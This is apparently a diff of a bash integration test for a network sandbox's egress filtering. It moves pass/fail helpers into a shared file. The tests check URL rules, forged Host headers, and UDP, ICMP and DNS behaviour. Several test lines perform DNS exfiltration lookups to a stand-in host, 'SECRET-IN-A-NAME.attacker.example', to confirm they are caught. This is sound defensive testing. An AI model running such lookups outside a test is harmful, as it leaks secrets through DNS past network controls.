@@ -24,35 +24,14 @@
 #   allowed_ip_rules:    ~^10\.200\.0\.\d+:9080$
 # ---------------------------------------------------------------------------
 set -uo pipefail
+source "$(dirname "${BASH_SOURCE[0]}")/helpers.sh"
 
-FAILURES=0
 S="curl -sS --max-time 10"
 # Deliberately unquoted here: $C is expanded unquoted below (word-split into
 # argv), so a literal quote around %{http_code} would become part of the
 # argument itself instead of being stripped -- see the direct curl calls
 # further down, where it's a single literal invocation and quoting is correct.
 C="curl -sS -o /dev/null -w %{http_code} --max-time 10"
-
-check_ok() {
-  local label="$1" out="$2" want="$3"
-  case "$out" in
-    "$want"*) echo "  PASS  $label" ;;
-    *)
-      echo "  FAIL  $label -- got: $out"
-      FAILURES=$((FAILURES + 1))
-      ;;
-  esac
-}
-
-check_status() {
-  local label="$1" code="$2" want="$3"
-  if [ "$code" = "$want" ]; then
-    echo "  PASS  $label"
-  else
-    echo "  FAIL  $label -- expected $want, got $code"
-    FAILURES=$((FAILURES + 1))
-  fi
-}
 
 echo "=== [URL rule - path allowed] ==="
 OUT=$($S https://allowed.example.com/public/pkg.tgz)
@@ -192,12 +171,10 @@ OUT=$($S --insecure -H 'Host: allowed.example.com' https://10.200.0.101/public/p
 case "$OUT" in
   PUBLIC\ GET*) echo "  PASS  forged Host reached the resolved origin, not the impostor" ;;
   IMPOSTOR*)
-    echo "  FAIL  forged Host reached the address the client chose (impostor)"
-    FAILURES=$((FAILURES + 1))
+    fail "forged Host reached the address the client chose (impostor)"
     ;;
   *)
-    echo "  FAIL  forged Host -- unexpected body: $OUT"
-    FAILURES=$((FAILURES + 1))
+    fail "forged Host -- unexpected body: $OUT"
     ;;
 esac
 
@@ -212,7 +189,7 @@ check_ok "GET tlspass.example.com:8443 (passthrough)" "$OUT" "PUBLIC GET"
 
 echo "=== [DNS-only exfiltration] ==="
 (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
-echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
+pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 # Nothing in the cage has a name, so the only question is how the lookup ends.
 # A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
@@ -224,8 +201,7 @@ RDNS_OUT=$(nslookup 172.20.0.1 2>&1 || true)
 case "$RDNS_OUT" in
   *NXDOMAIN*) echo "  PASS  the reverse lookup was refused outright" ;;
   *)
-    echo "  FAIL  the reverse lookup was not answered NXDOMAIN -- got: $RDNS_OUT"
-    FAILURES=$((FAILURES + 1))
+    fail "the reverse lookup was not answered NXDOMAIN -- got: $RDNS_OUT"
     ;;
 esac
 
@@ -234,20 +210,20 @@ esac
 # to an exfiltration name must not be a way out of the report.
 echo "=== [Reverse zone, invented name] ==="
 (nslookup SECRET-IN-A-NAME.in-addr.arpa >/dev/null 2>&1 || true)
-echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
+pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 # apt asks for this on every repository it fetches from, and falls back to the
 # plain name when nothing comes back. The lookup works; reporting it as blocked
 # would fail a step that ran fine.
 echo "=== [Service discovery, host allowed] ==="
 (nslookup -type=SRV _http._tcp.allowed.example.com >/dev/null 2>&1 || true)
-echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
+pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 # Prefixing `_a._tcp.` must not be a way out of the report, so the verb above
 # is held to names under a host the rules allow.
 echo "=== [Service discovery, host not allowed] ==="
 (nslookup -type=SRV _mongodb._tcp.SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
-echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
+pass "queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
 echo "=== [Address in a URL rule] ==="
 OUT=$($S http://10.200.0.100/pub-by-addr/x)
@@ -294,27 +270,23 @@ check_status "GET http://10.200.0.101/ (impostor, no rule)" "$CODE" "403"
 echo "=== [UDP is dropped] ==="
 UDP_OUT=$(echo probe | nc -u -w 3 10.200.0.102 9999 2>/dev/null || true)
 if [ -z "$UDP_OUT" ]; then
-  echo "  PASS  UDP to the echo server got no reply (cage drops it)"
+  pass "UDP to the echo server got no reply (cage drops it)"
 else
-  echo "  FAIL  UDP left the cage: got reply [$UDP_OUT]"
-  FAILURES=$((FAILURES + 1))
+  fail "UDP left the cage: got reply [$UDP_OUT]"
 fi
 
 echo "=== [DNS is the one exception] ==="
 if nslookup allowed.example.com >/dev/null 2>&1; then
-  echo "  PASS  DNS still resolves"
+  pass "DNS still resolves"
 else
-  echo "  FAIL  DNS lookup failed"
-  FAILURES=$((FAILURES + 1))
+  fail "DNS lookup failed"
 fi
 
 echo "=== [ICMP is dropped] ==="
 if ping -c 1 -W 2 10.200.0.100 >/dev/null 2>&1; then
-  echo "  FAIL  ping left the cage"
-  FAILURES=$((FAILURES + 1))
+  fail "ping left the cage"
 else
-  echo "  PASS  ping did not leave the cage"
+  pass "ping did not leave the cage"
 fi
 
-echo "=== End of scenarios: $FAILURES failure(s) ==="
-exit "$FAILURES"
+scenario_results
